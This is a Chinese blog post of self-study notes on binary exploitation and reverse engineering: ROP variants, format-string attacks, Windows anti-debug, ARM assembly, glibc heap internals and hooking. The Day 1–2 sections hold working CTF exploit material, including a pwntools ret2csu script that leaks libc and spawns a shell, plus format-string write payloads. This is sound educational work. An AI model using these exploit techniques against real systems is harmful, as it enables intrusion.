---
title: 365 Days Xuanwu Job Note
date: 2026-08-11 15:33:37
categories:
- dev
- cybersecurity
---

来源: 知名开源项目https://github.com/Vancir/365-days-get-xuanwulab-job

对内容进行了一些更新，以及部分比较基础的内容去除/合并了。以下是学习笔记

### Day 1
这两日的主要内容是经典的stackoverflow加上ROP exploit. 主要使用的工具是pwntools, pwndbg, ghidra
首先是复习一些x86的汇编

`call`等价于
* push the address of the next instruction (return address)
* jump to the function

cdecl calling convention: 由caller来修改esp(即清除stack上的arguments)

`leave`即离开当前stack frame，约等于把ebp和esp归位
`ret` pop出return address然后jump回去
`dword ptr`: double word pointer
`dword ptr [esp], eax`: 将esp视作指向32bit value的pointer，将eax的值写入其中

工具和小技巧:
* `pwndbg`中可以设置`layout pwndbg`，类似于gdb自己的tui，可以可视化地看assembly, stack之类的。ctrl+x a关闭/开启
* `pwndbg`可以用`tele`查看stack上的状况
* `strings`查看executable中的ascii字符串，用`-n`指定最短长度，比如5

ROP(return oriented programming)是一种利用程序中已有的一些gadgets来改变某些register/变量的值，进而达到控制整个control flow的目的的攻击方式

接下来讲解[basic ROP](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/)中的几个案例。

**ret2text**: 首先用`checksec`看到没有PIE。然后直接启动pwndbg在main打上bp。用`strings`查找字符串发现有`/bin/sh`，然后在pwndbg中search找到对应的位置。
我们会发现有个隐藏的`secure`函数(可以通过ghidra/IDA也可以通过直接查看symbols来确认)
然后我们查看ebp和buffer的地址，然后算出偏移，就可以直接构造payload了。需要overwrite的值就是`buffer - ebp + 4`，`ebp`指向的地方存的是旧的ebp，在他上面则是存的return address
也可以直接用`pwn cyclic`生成cyclic 串然后输入，再直接看ebp的地方存了什么，然后用`pwn cyclic -l`查看就行。

**ret2shellcode**: 基本上一样，区别在于目标buffer从stack移动到了bss。然后我们需要自己构造shellcode填入buffer然后执行。

**ret2syscall**: 这个更加复杂一些。首先找到return address的offset是112。然后我们的目标是利用gadgets来执行`execve("/bin/sh", NULL, NULL)`来获得shell。

我们需要构造的stack长这样
```text
lower addresses
+-----------------------------+
| 0x080bb196                  | <- pop eax ; ret
+-----------------------------+
| 0x0000000b                  | <- value for EAX // pop eax会吃掉这个
+-----------------------------+
| 0x0806eb90                  | <- pop edx ; pop ecx ; pop ebx ; ret
+-----------------------------+
| 0x00000000                  | <- value for EDX
+-----------------------------+
| 0x00000000                  | <- value for ECX
+-----------------------------+
| 0x080be408                  | <- value for EBX: address of "/bin/sh"
+-----------------------------+
| 0x08049421                  | <- int 0x80 // trigger syscall的interrupt
+-----------------------------+
higher addresses
```

基本原理就是，`ret`会从stack上pop出下一个instruction的地址，所以可以通过这种方式chain起来
我们需要用`ROPgadget`寻找这些gadget的地址，然后再构造payload

**ret2libc**: 
plt: Procedure Linkage Table
在执行libc函数，比如`puts`的时候，会出现`call puts@plt`，其中`.plt`中的`puts`不是真正的代码，而是一个跳板，帮助找到libc中真正`puts`的位置。
got: Global Offset Table
地址表，在第一次call的时候got中还没有libc函数的真正地址，因此plt会直接跑到`plt0`然后把控制权交给linker的resolver。最终会计算出`puts = libc_base + puts_offset`，而后写会got (即lazy binding，要用的时候再bind)。

因此，只需要把got中某个libc函数的address print出来，我们就可以知道offset，进而可以把control flow导向libc中的gadgets
如果PIE关闭，那么程序本身的`puts@plt`和`puts@got`是知道的。构造rop chain: 
```
pop rdi ; ret
puts@got  // elf.got["puts"]
puts@plt
main
```
然后再从print出的信息，计算offset从而构造新的payload执行attack。
如果开启了PIE，则main program自己也会被随机化base address，在这种情况下需要先想办法获取main program中某些的address，然后获得base，再加上`puts@plt`和`puts@got`的offset

这个就对应ret2libc的example 3的操作

### Day 2
**ret2csu**: 理念上和basic rop是一样的，但是用的gadget不一样，因此会更复杂一点。
这里利用的是`__libc_csu_init`中的gadgets。两个gadget分别是
```text
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
...
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
```
第一部分从r13-r15中获取rdx, rsi, edi然后调用`r12`指向的函数(`r12`应该储存一个指向函数的指针，而不是直接储存函数地址)
写入`edi`只会写入low32b，而high32b会被清空，但在这里问题不大。
第二部分从stack上pop出如上的这些registers的值。
然后直接看ctfwiki上的exploit:
```py
def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = b'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    time.sleep(1)

# 实际上应该写成
def csu_call(rbx=0, rbp=1, pointer_to_func, arg3, arg2, arg1, back_to)
```
几个点:
* 先进入第二个gadget，控制register的值，然后return到第一个gadget
* `'a' * 0x38`是因为我们不会执行`jnz`，而是在第一个gadget执行完回到第二个gadget，执行`add rsp,8`开始的instructions，因此我们需要pad `8+8*6=56=0x38`个bytes。最后再回到`last`指定的位置



然后我们来看几个csu的call
```py
sh.recvuntil(b'Hello, World\n')
csu(0, 1, write_got, 8, write_got, 1, main_addr)
```
等价于`write(1, write_got, 8)`，即向`stdout`(1) 写入`8` bytes的值，值为`write_got`(即`write`在got中储存的地址)
当然最终需要回到`main`来进行下一步exploit

```py
write_addr = u64(sh.recv(8))
log.info(f"Leaked write address: {hex(write_addr)}")

libc_base = write_addr - libc.symbols['write']
log.success(f"Libc base address: {hex(libc_base)}")

execve_addr = libc_base + libc.symbols['execve']
log.success(f"Execve address: {hex(execve_addr)}")
# 上面的计算获取offset和execve的地址

sh.recvuntil(b'Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + b'/bin/sh\x00')
```
上面这个call相当于`read(0, bss_base, 16)`，即从`stdin`(0)读取`16` bytes到`bss_base`。
而后写入地址，8byte的`execve_addr`和8byte的`"/bin/sh\0"`
这是因为`r12`需要一个pointer to function，因此我们必须先找个地方存下这个pointer

```py
sh.recvuntil(b'Hello, World\n')
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()
```
这个就简单了，相当于`*bss_base("/bin/sh", 0, 0)`，即`execve("/bin/sh", 0, 0)`。

文中还介绍了一个技巧: CPU的instruction decode并不会管哪里是boundary
假设我们有一条instruction
```asm
41 5d    pop r13
```
如果从当中开始decode，那么
```asm
5d       pop rbp
```
也就是加了这个`41` 相当于给register的index加了8。
更重要的是x86的instruction本身是variable length的，也就是说一个instruction从当中切开，前面是prefix而后面还是一个完整的instruction。而cpu会直接执行这个完整的instruction，不会再往后面读。所以，后续的指令并不会被我们这个从中间切开的地址影响。

**BROP** Blind ROP
攻击条件是有stackoverflow，并且服务器crash后重启地址不变，即ASLR只有最初启动时有用。
首先暴力枚举溢出长度直到程序crash。按照byte一个个进行爆破，64b最多需要$2^8\times 8 = 2048$次
这个exploit比较复杂

然后需要寻找能用的gadgets。
* stop gadgets，即程序进入这个状态后会无限循环而不会crash。这样attacker才能知道自己猜到了对的gadget
* trap gadgets, 进入后程序立刻crash的gadget.
* brop gadgets, 能控制传参的gadget，典型例子为csu尾部的rop chain

在stack上摆放stop/trap gadgets，不断probe。通过程序是否crash来找出不会pop stack的gadget; 只pop一个variable的gadget; ...
如果probe本身是个stop gadgets，只要后面都是trap gadgets就可以发现。

寻找plt：plt表结构规整，大部分plt调用都不太会crash。如果发现连续的16B对齐地址都没crash，+6后也不crash，那么就要怀疑是否碰到了plt
然后需要确认plt中的`strcmp`(或其他类似函数)，用来控制rdx，而后寻找`write`或者`puts`之类的输出函数(write需要3个参数，因此需要`strcmp`或其他函数来控制rdx)。`strcmp`只有在两个参数都不是bad address的时候才会执行，这个性质可以用来确定哪个表项是`strcmp`

后面的例子比较复杂，之后可以重新review一下

**Format String Vulnerability**: 这个比较简单。如果用户可以控制format string，那么首先可以用大量`%s`来让程序crash，也可以直接dump stack上的内容，甚至可以用`%n`进行任意写。

总体思想就是padding+address+写入。比如
`[addr]%012d%6$n`
先写address，然后需要知道我们的format string在stack上的位置，这里是第6个format arg，所以我们用`%6$n`来把值写入第六个argument代表的pointer(即`addr`)，然后用`%012d`进行padding，把值pad到16，或者其他我们希望写入的值。
另外address不一定需要放在最前面。比如我们希望写入`2`，那也可以直接`aa%8$n[addr]`之类的(`8`是随便写的数字)
对于写入大数字，我们倾向于用`%hhn`(单byte)和`%hn`(双byte)

在例子一节里介绍的攻击：
* hijack GOT，直接把puts之类的函数的got项修改为system或其他危险函数的地址，在下次执行puts时就会直接执行system
* hijact return address，获得offset，然后直接修改return address到想要的地方
* 堆上字符串，将栈迁移上堆(stack pivoting)。这个比较麻烦，需要寻找很多地址。因为format string在heap上也就意味着往stack上一直读并不会读到format string自身，也就没办法直接在format string里面注入一个address。但是在这个example里，saved ebp本身会被当作format argument读到。但因为我们只能直接往saved ebp写，也就意味着我们不能用`hhn`之类的手段，只能一次写完，这可能导致exploit失败

### Day 3
**Windows Anti-debug**:
主要参考[这篇](https://ctf-wiki.org/reverse/platform/windows/anti-debug/example/)
* `IsDebuggerPresent`: 单纯检测`BeingDebugged` flag的值，直接手动设置一下或者手动改返回值就可以绕过。
* `NtGlobalFlag`: PEB中的一个字段，有一些flag。只有进程由debugger创建(而非attach)时才会被设置。绕过检测也很简单，用一些插件，`windbg -hd`禁用调试堆，也可以直接手动修改flag的值。
* `Interrupt 3`: `EXCEPTION_BREAKPOINT(0x80000003)`触发时，`EIP`不会像其他异常处理时一样被指向异常的下一句指令。
* `CheckRemoteDebuggerPresent`: remote指的是同一台机器的不同进程，检测指定进程是否在被debug。通过`NtQueryInformationProcess`来完成。可以直接修改值或者jump flag来绕过。
* `NtQueryInformationProcess()`: 有几个信息类。`ProcessDebugPort`来自内核，很难直接绕过。通过读取`EPROCESS`的`DebugPort`来判断。还有一些其他的信息类
* `ZwSetInformationThread()`: 通过传入特定参数来禁止thread产生调试事件。绕过只需要修改传入函数的参数。
* 时间差检测: 获取调试和非调试下的时间差异来判断

**VM检测**:
* BIOS
* 字符串特征
* VMWare IO Port

其他的保护策略:
数据校验: 计算好checksum运行时比较是否被修改
内存校验: 类似，检测一些不应该被修改的segment是否被修改
Shadow Stack: 在存return address时在另一个栈上(shadow stack)也存一份，返回前检查两个地址是否相等。这能有效阻止ROP
Windows CFG (Control Flow Guard): 在security的课程中学到过。简单来说就是分析正常来说当前函数可能会jump到哪些函数。如果jump到不应该去的函数，那就说明control flow被劫持了，比如有人利用了stackoverflow，然后试图return回一些危险的函数来获得控制权。
Virtualization Obfuscation: 自己定义一套VM，寄存器，stack，opcode，把原始代码翻译成自己的bytecode再执行。
保护壳: 用来保护软件不被非法修改或反编译的技术。先于程序运行，拿到控制权，完成保护软件的任务。有压缩壳，即运行时再解压，和加密壳，即运行时再解密。但壳本身也是一个正常程序，仍然可以被debug。可以通过一些debug手段来停在OEP(original entry point)之前，把真正的程序dump出来。
IAT(Import Address Table) Obfuscation: 导入表加密，防止attacker通过IAT获得太多symbol信息，把API的语义隐藏。具体来说，可以用API hashing，即算hash来找到匹配的api，让api只以一串hash的形式出现。IAT模拟: 自己实现一些可能调用的外部函数
模块拷贝移位: 用来对抗hook。重新读一份dll，然后加载。在原来的dll上设置的hook就被绕开了。
代码混淆(obfuscation): 用一些策略来干扰静态分析工具，包括
* String Encryption: 避免暴露裸的string text
* Dynamic code loading / packing: 在运行时load一些代码而不是直接全部打包
* Control Flow Obfuscation: 即加入一些垃圾让程序的control flow变得乱七八糟，难以分析。
* Dead Code Injection: 注入垃圾代码让reverse engineering时需要分析的东西变多
* Symbol Stripping: rename一些本来比较固定的symbols
* Control Flow Flattening: 用dispatcher/state machine代替原本的control flow
* Junk Code: 增加垃圾，干扰静态分析

(Arm部分移动到Day 4)

### Day 4
ARM32，主要基于 https://azeria-labs.com/writing-arm-assembly-part-1/
(AArch32即ARM Architecture 32Bits, 和ARM32是一个意思)
以下内容如无额外说明则均基于ARM32，在最后会有关于ARM64的部分

Part I. Intro
ARM是RISC (reduced instruction set computing)处理器，instruction的数量更少，registers更多。只有load/store可以access memory. 在version 3后ARM是Bi-endian的，可以自己设置

Part II. Data Types and Regs
`-h`,`-sh`: half words; `-b`, `-sb`: bytes; no extension: words
比如，
```
ldr: load word
ldrh: load half word
ldrsh: load signed half word
ldrsb: load signed byte
```

30 registers, 16在usermode可用。
* `r0-12`都是general purpose
* `r7`一般约定存syscall number
* `r11-15`分别是FP (frame pointer), IP (intra procedural call scratch register，就是一个在函数调用时存临时值的register), SP (stack pointer), LR (link register，即return address), PC (program counter)
* CSPR: current program status register

Function call的前四个arg约定在r0-r3
在执行过程中，`PC`会指向当前instruction+8 (2条instructions后, ARM state) 或+4 (2条thumb instructions后，thumb state)。这个设计是为了兼容性，因为旧的arm processor一次fetch两条instructions

`CSPR`: 有很多flag类似于x86的`EFLAG`，包括N(negative, =SF),Z(zero, =ZF),C(carry, =CF),V(overflow, =OF), E (endian), T (thumb)之类的
(subtraction的结果$\geq 0$的时候，carry会被设置为1)

Part III. ARM & THUMB
ARM state的instruction永远是32b，Thumb state时16b但也可以时32b。这个在不同arm版本下都有所不同，比较复杂，在用的时候应该check对应版本的说明。

* ARM的所有instruction都支持conditional execution (run/skip based on status flags，可以减少不必要的branch/jump)。Thumb在某些版本有支持。
* ARM支持barrel shift. barrel shifter时一个hardware，在执行指令的同时执行shift。因此可以执行类似`MOV R1, R0, LSL #1`的指令，即把R0移动给R1，同时左移一位

在ARM和Thumb之间switch: 
* 可以用BX (branch and exchange), BLX (branch, link, and exchange)去把目标register的LSB修改为1。这不会导致alignment issue因为processor在执行时会忽略LSB
* CPSR的T bit如果是1，就代表我们在Thumb mode

ARM指令基本格式是
```
mnemonic{suffix}{condition} {dest_reg}, operand1, operand2
```
`condition`就是CPSR的特殊bit。`#...`表示immediate value
```asm
ADD R0, R1, R2    @ R0 = R1 + R2
ADD R0, R1, #2    @ R0 = R1 + 2
MOVLE R0, #5      @ if E is set, R0 = 5
MOV R0, R1, LSL #1   @ R0 = (R1 << 1)
```

Part IV. Load and Store
和x86不同，ARM里只有load/store可以access memory。
offset的形式可以是immediate value, register，或scaled register

最基本的:
```asm
LDR R2, [R0]   @ R2 = *R0
STR R2, [R1]   @ *R1 = R2
```

在assembly中可以用label或者PC-relative addressing表示地址
Offset形式
* `STR Ra, [Rb, #imm]`即`*(Rb+imm) = Ra`
* `STR Ra, [Rb, #imm]!` (pre-indexed)，即`*(Rb+imm) = Ra; Rb += imm`
* `STR Ra, [Rb], #imm` (post-indexed), 即`*Rb = Ra; Rb += imm`

使用register的形式类似，即把`#imm`替换为register
使用scaled register形式也类似，即`STR Ra, [Rb, Rc, <shifter>]`
* `STR R2, [R1, R2, LSL#2]`: `*(R1+R2<<2) = R2`

Pseudo-instructions: 可以用下面的方法去reference data in the literal pool
`ldr r0, =jump` (load the address of the label `jump`)

ARM instruction的组成和immediate value的限制:
ARM单条instruction长32b。conditional code占4爸，dest register占2b，第一个operand占2b，set-status flag占1b，还有opcode本身占用的bits，因此在设计上，每条instruction只有12b可以用来存immediate values。然后这12b被拆分为8b的number，以及4b的right rotation field
对于太大的value，除了直接拆以外，也可以用上面的技巧，比如`LDR r1,=511`。如果这里的值比较小则会被assembler转换为mov

Part V. Load/Store Multiple
`LDM`和`STM`可以用来load/store多个值
`ADR r0, words+12`: `r0 = &words[3]`
`LDM r0, {r4,r5}`: `r4 = *r0; r5 = *(r0+4)`
`STM r1, {r4,r5}`: `*r1 = r4; *(r1+4) = r5`
Variations: `-IA` (increase after), `-IB`(increase before), `-DA` (decrease after), `-DB`(decrease before)
`LDM` is the same as `LDMIA`, address for the next element is *increased after* each load. 
`LDMIB`类似，相当于从`+4`的offset起始，连续读入
`LDMDA`使用时，registers本身也会loaded backwards，即
`LDMDA r0, {r4-r6}`相当于 `r6 = *r0; r5 = *(r0-4); r4 = *(r0-8)`
`LDMDB`类似，相当于从`-4`的offset起始

Push and Pop. 
* `push`相当于`sp-4`然后把值放在新的`sp`指向的地方
* `pop`相当于从`sp`指向的地方读一个值，然后把`sp+4`

`push {r0, r1}`相当于`stmdb sp!, {r0, r1}`(因此实际order是先r1再r0)
`pop {r4, r5}`相当于`ldmia sp!, {r4, r5}`

Part VI. Conditional Execution
一共有16个conditions，包括`EQ` (`Z==1`)，`GT` (`Z==0 && N==V`)，`LE` (`Z==1 || N!=V`)之类的
例子:
```asm
cmp r0, #3
addlt r0, r0, #1
```
相当于，如果`r0 < 3`，则`r0 += 1`。

对于Thumb，部分版本支持`IT` instruction (if-then)，具体来说，对于`IT`,下一个instruction会是conditional的，对于`ITT, ITE`(if-then-then, if-then-else)，后两个instructions是conditional的，还有`ITTE, ITTEE`
```
.code 16
ITE EQ
ADDEQ r1, #2 @ 这一条必须也是EQ
addne r1, #3 @ 这一条必须是inverse
```

Branches (jumps)用于If和loops，比如
```asm
cmp r1, r2
blt r1_lower
...

r1_lower:
...
```

这就是一个典型的if。类似地也可以创建一个loop
branch有三个指令
* `B` (branch): 直接jump
* `BL` (branch link): `LR = PC+4`，然后jump
* `BX` (branch exchange) 和 `BLX` (branch link exchange): 和B/BL一样，同时 exchange instruction set (ARM/Thumb)。需要一个register作为operand

Part VII. Stack and Functions
Stack有各种实现形式，比如full descending，sp指向最后一个合法元素，然后stack grows down
FP指向一个stack frame的底部，即这个stack frame开始的地方，stack frame中需要储存return address (即previous LR)，previous frame pointer，以及其他需要保存的registers。函数call的参数太多时stack也会被用来传参。
一个函数，就和x86的一样，由prologue，body，epilogue组成
prologue即把需要存的值push上stack; epilogue用来恢复在prologue存的值
返回值一般存R0; 对于leaf function，可以不用存LR


AArch64简介
这一部分在原计划没有，但现在AArch64还是比较popular的，mac证明了arm架构的潜力。因此这里略微进行一点学习。
首先register的数量变多，可用registers数从16变成31。然后ISA(Instruction Set Architecture) 从A32+Thumb变成A64。


Register上，arm64有`x0-x30`，然后`w0-w30`是64b register的low32bit view。写入`w` register会把upper 32b设置为0。此外有单独的`sp`。`pc`不再是一个GPR(general purpose register)，不能直接像操作其他register一样操作`pc`。`x29`是convention上的frame pointer。特别地，arm64提供了zero register `xzr`(64), `wzr`(32)。便于直接丢弃不需要的result，比如一个只需要设置flag的操作。比如，`cmp x0, x1`本质上是`subs xzr, x0, x1`

函数调用相关: arm64中直接用`ret`而不是`bx lr`。但调用时仍类似。registers分为caller-saved和callee-save，因为register数量变多了，这方便的convention自然也有一些变化。

arm64移除了arm32中的general conditional execution，因此大部分情况还是需要用branch。flag (NZCV)是一样的，但并不是所有instruction都会update flag，比如`add`不会修改NZCV而`adds`会

arm64的每条指令都是32b。因此immediate的范围仍然很小。但可以用`movz` (move zero，其他设置为0)，和`movk` (move keep，其他保持不变)来一次修改16b地读入immediate。此外还有`movn`，计算immediate的bitwise inverse后读入，也就是其他都是1。`add`/`sub`仍然是接受一个12b immediate + optional shift。对于logical指令，给的immediate被认为是代表一个repeated pattern(也就是可以很高效得进行状态压缩之类的操作，比如把8个`int8`压缩成一个`int64`后用mask操作)

arm64仍然可以进行barrel shift的操作。load和store基本一样。

由于指令长度被限制，jump的offset同样有限制。需要jump太远的话就需要assembler/linker搞一个veneer/trampoline

SIMD/floating point register: arm64提供`v0-v31`的128b register，同样有不同的view，比如`d0`就是64b view，可以进行`fadd`浮点数加的操作


原Day 4中还包含CTF中其他stackoverflow的内容，主要是stack pivoting和stack smash。前者在之前已经学习过，stack smash即利用canary检查到溢出后，调用`__stack_chk_fail`来print `argv[0]`的行为，覆盖`argv[0]`来泄露信息。

### Day 5 & 6
关于整数溢出，实际上没有太多值得讨论的。大多来源于缺少对变量大小的约束，和不规范的type conversion。有些时候，溢出的整数被用于给`malloc`传参，进而导致堆溢出或者直接crash (因为无法分配这么多内存)

heap allocation的exploit例子: https://github.com/shellphish/how2heap

现代malloc: https://www.deep-kondah.com/glibc-heap-internals (备注: 实际上这篇写的不太好，没有合适的overview就直接开始讲源码，不便于理解)
这里的笔记基于上面这篇对于glibc 2.42的默认allocator `ptmalloc`的分析进行

注意区分glibc的allocator和linux自身的memory management。两者在设计上其实有一定的相似性，但所管理的资源不同。

一个process在64b下的vm layout，从上到下是: kernel, reserved, stack, mmap, heap, `.bss`(uninitialized), `.data`(initialized), `.text`(code), reserved

首先，在最开始，我们需要一个big picture，不然很容易晕头转向。
```text
application calls malloc / free / realloc
                |
        per-thread fast path: tcache
                |
         arena selection
                |
    +-----------+-------------------+
    |                               |
 main_arena                    other arenas
    |                               |
    +------ arena-local allocator --+
                |
         arena-managed chunks
                |
    +-----------+------------+
    |                        |
 fastbins / bins           top chunk
                              |
                         insufficient
                              |
                          sysmalloc()
                         /           \
                      brk             mmap
                (main arena)     (possible fallback/large requests)

Separately:

sufficiently large malloc request
                |
                +----> direct mmap chunk
```


Arena: 独立的allocator instance，用来解决多线程时竞争问题。main-arena的背后是传统的heap，即基于`brk`分配。而其他的secondary arenas则通过`mmap`获得`heap_info`加上heap region。secondary arena的数量是有限制的
Bins: 组织free chunks的工具，或者说，index。`fastbin`用来快速reuse一个tiny chunk(故意defer consolidation)，`smallbin`指向exact-size reusable的小chunk，`largebin`指向variable-size的大chunk (便于找到最合适的chunk), `unsorted bin`相当于一层cache储存最近free的large chunk
tcache在arena system之上。在thread中进行malloc时，首先尝试从tcache中寻找一个合适的chunk。每个thread都有自己的thread-local tcache
TOP chunk时一个特殊的free chunk，在一个arena管控的memory的最顶端。如果所有的bin都不work，那可以直接从top chunk切一块内存用。只有top切不出来的时候才需要找os要额外内存

VM以chunk组织，chunk可以属于process heap (main arena)，也可以被一个`vm_area_struct`表示于mmap的一个区域，即属于thread arena。thread arena由mmap创建，需要有`heap_info` struct，这些heap info被chain在一起，因为他们在mmap区域中不一定连续，因此需要有办法遍历他们。
对于非常大型的chunk，会直接用`mmap`去allocate。

`malloc_chunk`可以在 https://elixir.bootlin.com/glibc/glibc-2.42/source/malloc/malloc.c, :1144处找到。

一个allocated chunk的组成是 `previous_size`, `chunk_size`(加上flags) 放在最前面，然后是payload，`malloc`直接return指向`payload`起始的指针。`previous_size`只有在前一个chunk是free的时候才有用，如果前一个chunk是allocated的，那么这个字段可以和前一个chunk的payload重叠
在`chunk_size`中有A, M, P三个flag。(因为`chunk_size`本身是aligned的，因此最后几个bit一定是0，所以这里用作表达flag)。这三个分别代表
* P: `PREV_INUSE`: 上一个chunk是allocated状态
* M: `IS_MMAPED`: 这个chunk是由`mmap()`直接获取的
* A: `NON_MAIN_ARENA`: 这个chunk属于的arena不是main arena

一个free chunk则储存`fd`, `bk` pointer以及`fd_nextsize`, `bk_nextsize`。这个是用来快速找到需要的size的free chunk用的，只有大的bin需要，因为小的bin是fixed size的。与此相关的是，:4291行提到，`maintain large bins in sorted order`

`malloc_state`可以在:1820的地方找到。arena所管理的就是这个state。其中的字段有
* 一个mutex
* `int have_fastchunks`，实际上是bool，但不是所有target都支持atmoic bool，因此用int表示
* `mfastbinptr fastbinsY[NFASTBINS]`: 一个储存fastbins的array
* `mchunkptr top`: top chunk，该chunk并不会出现在bin中
* `mchunkptr last_remainder`: 由最近的split造成的未使用的剩余部分
* `mchunkptr bins[NBINS*2 - 2]`: bins (每个bin都要存一个fd和一个bk，因此是2的倍数)
* `unsigned int binmap[BINMAPSIZE]`: 用来快速查找空bins的bitmap
* `struct malloc_state* next`: 以链表形式组织起所有arena
* 还有几个其他的字段，包括从system分配的内存，有多少thread attach在当前arena等

tcache里的bins的储存方式类似于arena中的bins。默认有64个small bins (exact-size)和12个large bins(variable-size)

glibc中会使用pointer mangling的方法来保护raw pointer:
```c
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```
利用ASLR提供的随机性，来增加和pointer相关的攻击的难度。这个可以结合其他check，比如地址必须aligned，因此attacker必须guess最后的四个bit是什么，不然就pass不了alignment check。这个技巧被用于实现safe-linking/unlinking。其他的allocator，比如tcmalloc中，也有类似的保护措施

在从os分配时，会利用到transparent huge pages (THP)，即把小的page group成2M的大page用来减少TLB的cache miss rate

glibc提供memory tagging (MT), 爸memory 分成fixed-size granules, 比如16B，然后每个granule会有一个memory tag，由硬件管理，用户完全不可见。在内存访问时，如果发现tag对不上，会直接触发错误。

另外在pwndbg中有很多可以查看allocator相关信息的command，可以用一下试试。

### Day 7
**Windows Debugger**
整体来说，windows debugger是个event-driven的设计。在这个文档中，我们可以看到所有的debugging events: https://learn.microsoft.com/en-us/windows/win32/debug/debugging-events。其中`EXCEPTION_DEBUG_EVENT`即是我们debug时常用的breakpoint，stepping等操作对应的event。值得注意的是，win32并不只代表32bit windows的api，也可能是一部分在32bit和64bit windows上都会运行的核心api

一个[debug event](https://learn.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-debug_event) struct包含event ode，process id，thread id，和一个各种info的union(对应前面提到的各种debug event)。
在windows暂定了target的运行后，debugger可以获取target的状态，通过不同api可以分别获得，registers(`GetThreadContext`)和memory (`ReadProcessMemory`)。一个software breakpoint的本质其实就是，debugger把instruction的第一个byte改成`0xCC`(即`INT 3`)，CPU在运行时会触发breakpoint exception 即`EXCEPTION_DEBUG_EVENT`的一种，而后把控制权交给debugger，debugger再将原来的byte写回。

如果程序本身有try catch，则在没有debugger的情况下，会直接经历raise exception -> Windows exception dispatcher -> program's exception handlers -> catch it的过程。而有debugger在其中时，会首先通知debugger。只有在debugger选择忽略的时候，才会把控制权交给原来的handler。但如果application的handler本身也没handle他，那么在SEH (structured exception handling)找不到任何可以handle这个exception的handler后，会再给debugger第二次机会(last-chance notification)。如果这时候还是忽略，那么程序就会终止。
在[`ContinueDebugEvent`](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-continuedebugevent)中，debugger可以选择传入一个status，如果传入`DBG_CONTINUE`，则windows会任务debugger已经处理完了exception，进而这个exception相关的任何信息**不会**被原程序看到。只有在`DBG_EXCEPTION_NOT_HANDLED`时，才会认为这是debugger忽略了first-chance event然后逻辑回到正常的exception handling

关于exception handling，一个simplified picture是
raise exception $\rightarrow$ kernel processing $\rightarrow$ debugger first chance $\rightarrow$ user-mode exception dispatch (`KiUserExceptionDispatcher`)$\rightarrow$ VEH (Vectored Exception Handlers) $\rightarrow$ frame-based SEH (Structured Excetpion Handler) $\rightarrow$ unhandled processing $\rightarrow$ debugger last chance $\rightarrow $ termination/default

其中，VEH会在stack unwinding之前被唤醒(优先级很高)，因为VEH和具体的stack frame无关，里面都是general的handler。所谓stack unwinding就是从stack上向上找到最近的能handle当前exception的handler后，把下面的stack全部清理掉的过程。而SEH就是传统的exception handling，比如我们定义的try catch block就在此类。
`KiUserExceptionDispatcher`是进入user mode exception handling的入口。可以被用来注入一些代码，进而在正常exception handling之前执行。

这个点在windows背景的ctf challenge中还是比较重要的，即需要知道在有exception的情况下program整体的logic flow是什么样的，应该去哪里找对应的handler之类的。

hardware breakpoint/watchpoint和software的不同。他们是由CPU的bug register实现的，而不是通过debugger patch指令的形式。因为debug register数量有限，hardware bp/wp的数量也是有限的。(x86/64上通常一个thread只有4个)
Hardware bp/wp可以break在指定的memory被read, read+write, 或excute的时候触发。即可以是一个execution breakpoint，也可以是一个data watchpoint。设置condition为hit时，产生的event一般是`EXCEPTION_SINGLE_STEP`。因为可以观察data变化，因此在需要监控哪些代码写入了一个不应该写入的变量时比较有用。

这里简单也了解一下linux的debugger。linux上的debugger时基于`ptrace`这个low-level interface，但整体上的设计两者是差不多的。linux使用的是signal而不是windows的exception，比如在stepping的时候对应`SIGTRAP`(breakpoint traps)。在hardware bp/wp上，gdb也可以用watchpoint，然后默认情况下，gdb会优先使用hardware wp，如果用不了再fallback到software bp(即一步一步运行，很慢)。

**Hooks**
https://github.com/microsoft/Detours/wiki/OverviewInterception
Inline Hook: 简单来说就是在一个function的prologue阶段覆写instructions (overwrite the in-process binary image)，让他直接jump到另外一个implementation。该实现会有个问题，如果hook在进行完操作(比如记录一些profiling的data)后希望调用原函数，那么会再次调用hook(因为binary直接被覆写了)。因此需要用trampoline来解决这个问题
假设我们原来的target有若干条instruction被覆写了，
```asm
target: 
    push ebp     ; -> jmp detour
    mov ebp, esp ; ...
    push ebx     ; ...
    push esi     ; ...
    push edi     ; unchanged
```

加上trampoline后，
```asm
target:
    jmp detour
    ...
    push edi

trampoline:
    push ebp
    mov ebp, esp
    ...
    jmp target+offset
```

*注*: instrumentation指的是插入额外代码来记录function call之类数据的手段，而profiling可以基于sampling(即在运行过程中sample一些data)或者instrumentation

值得注意的是在实现上，detour的patch必须是atomic的，不能留patch了一半的代码在内存中。detour完全只修改callee function，不需要任何和caller有关的修改。

IAT-hooking (Import Address Table): 即修改IAT 表中的function pointer。即修改caller使用的指针。当然这个很不安全，因此microsoft将IAT改为了在load后是write-protected的: https://devblogs.microsoft.com/oldnewthing/20221006-07

`SetWindowsHookEx`: 相当于register一个callback，在监控到一些特定event的时候callback会被调用。

